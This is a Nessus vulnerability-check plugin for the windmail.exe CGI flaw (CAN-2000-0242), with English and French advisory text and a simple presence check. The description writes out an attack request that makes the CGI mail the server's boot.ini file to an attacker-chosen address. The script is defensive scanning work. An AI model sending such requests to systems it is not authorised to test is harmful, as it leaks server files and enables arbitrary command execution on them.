#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10365);
 script_version ("$Revision: 1.11 $");
 script_bugtraq_id(1073);
 script_cve_id("CAN-2000-0242"); 
 name["english"] = "Windmail.exe allows any user to execute arbitrary commands";
 name["francais"] = "Windmail.exe allows any user to execute arbitrary comands";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'windmail.exe' CGI is installed. 
 
Some versions of this CGI script have a security flaw that lets 
an attacker execute arbitrary commands on the remote server.

To test this, make the following request :

GET /cgi-bin/windmail.exe?-n%20c:\boot.ini%20you@youraddress.com

(replace you@youraddress.com by your real email address). 

If you receive the content of the file boot.ini,
then your server is vulnerable.

Solution : remove it from /cgi-bin. See www.geocel.com
           for a new version.

Risk factor : Serious";


 desc["francais"] = "Le cgi 'windmail.exe' est installé. Celui-ci possède
un problème de sécurité qui permet à n'importe qui de faire
executer des commandes arbitraires au daemon http.

Pour déterminer si vous etes vulnérable, alors faites
la requete :

GET /cgi-bin/windmail.exe?-n%20c:\boot.ini%20you@youraddress.com

(remplacez you@youraddress.com par votre vraie adresse email).

Si vous recevez le contenu du fichier boot.ini, alors vous
etes vulnérable.


Solution : retirez-le de /cgi-bin. Allez sur www.geocel.com pour
           obtenir une nouvelle version.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/windmail.exe";
 summary["francais"] = "Vérifie la présence de /cgi-bin/windmail.exe";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

port = is_cgi_installed("windmail.exe");
if(port)security_hole(port);

